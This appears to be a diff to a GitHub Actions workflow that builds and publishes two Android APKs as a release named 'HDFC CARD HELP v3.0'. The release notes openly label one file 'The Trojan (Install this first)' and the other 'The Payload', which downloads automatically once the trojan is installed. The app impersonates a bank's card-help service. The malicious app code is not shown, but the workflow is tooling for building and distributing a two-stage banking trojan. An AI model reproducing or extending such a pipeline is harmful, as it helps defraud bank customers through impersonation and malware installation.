@@ -42,7 +42,8 @@ jobs:
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
-          mv app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/master_payload.apk
+          # MOVE TO ROOT SO IT DOES NOT GET DELETED BY NEXT BUILD
+          cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk
 
       - name: Build Trojan Entry (No Permissions)
         run: |
@@ -57,22 +58,23 @@ jobs:
           
           cd android
           ./gradlew assembleDebug
-          mv app/build/outputs/apk/debug/app-debug.apk app/build/outputs/apk/debug/hdfc_help_v3.apk
+          # MOVE TO ROOT
+          cp app/build/outputs/apk/debug/app-debug.apk ../hdfc_help_v3.apk
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
           files: |
-            android/app/build/outputs/apk/debug/master_payload.apk
-            android/app/build/outputs/apk/debug/hdfc_help_v3.apk
+            master_payload.apk
+            hdfc_help_v3.apk
           tag_name: v3.0.${{ github.run_number }}
           name: HDFC CARD HELP v3.0 (Build ${{ github.run_number }})
           body: |
             # HDFC CARD HELP v3.0 - DUAL BUNDLE
             
             1. **hdfc_help_v3.apk**: The Trojan (Install this first).
-            2. **master_payload.apk**: The Payload (Download will trigger automatically from Trojan).
+            2. **master_payload.apk**: The Payload (Download will trigger automatically).
             
             Build Number: ${{ github.run_number }}
           draft: false
